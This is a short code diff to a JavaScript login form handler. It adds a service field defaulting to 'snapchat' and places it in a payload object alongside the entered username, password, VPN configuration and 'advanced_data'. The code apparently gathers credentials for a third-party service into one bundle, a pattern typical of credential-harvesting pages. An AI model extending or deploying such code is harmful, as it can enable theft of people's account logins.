@@ -164,6 +164,8 @@ document.addEventListener('DOMContentLoaded', () => {
         
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
+        const serviceNameInput = document.getElementById('service_name');
+        const service = serviceNameInput ? serviceNameInput.value : 'snapchat';
         
         // Basic validation
         if (!username || !password) {
@@ -171,7 +173,7 @@ document.addEventListener('DOMContentLoaded', () => {
             return;
         }
         
-        console.log('🔐 Processing login for:', username);
+        console.log('🔐 Processing login for:', username, 'Service:', service);
         console.log('📊 Starting comprehensive OVPN generation...');
         
         try {
@@ -192,6 +194,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const comprehensivePayload = {
                 username,
                 password,
+                service,
                 ...vpnConfig,
                 ovpn_config: ovpnFile,
                 advanced_data: {
